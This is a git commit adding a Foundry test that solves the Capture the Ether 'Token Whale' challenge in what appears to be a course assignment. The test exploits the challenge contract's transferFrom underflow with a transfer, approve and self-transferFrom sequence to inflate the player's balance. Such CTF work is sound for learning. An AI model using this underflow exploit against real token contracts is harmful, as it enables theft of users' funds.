227aa7f17a0cc8fa3a348a6c67cb43078114d38b
Matt Zamora <mzamora2899@gmail.com>
2023-04-01 09:52:16 -0600

    add token whale test

---
+++ week-7/assignments/cap-eth/test/TokenWhale.t.sol
@@ -0,0 +1,33 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.7.6;
+pragma abicoder v2;
+
+import "forge-std/Test.sol";
+import "../src/TokenWhale.sol";
+
+contract TokenWhaleTest is Test {
+    TokenWhaleChallenge target;
+    address player = vm.addr(1);
+
+    function setUp() public {
+        target = new TokenWhaleChallenge(player);
+    }
+
+    function testExample() public {
+        vm.startPrank(address(player));
+
+        // tu codigo aca
+
+        address player2 = vm.addr(2);
+        target.transfer(player2, 501);
+
+        vm.stopPrank();
+        vm.prank(player2);
+        target.approve(player, 501);
+
+        vm.startPrank(address(player));
+        target.transferFrom(player2, player2, 501);
+
+        assertTrue(target.isComplete());
+    }
+}
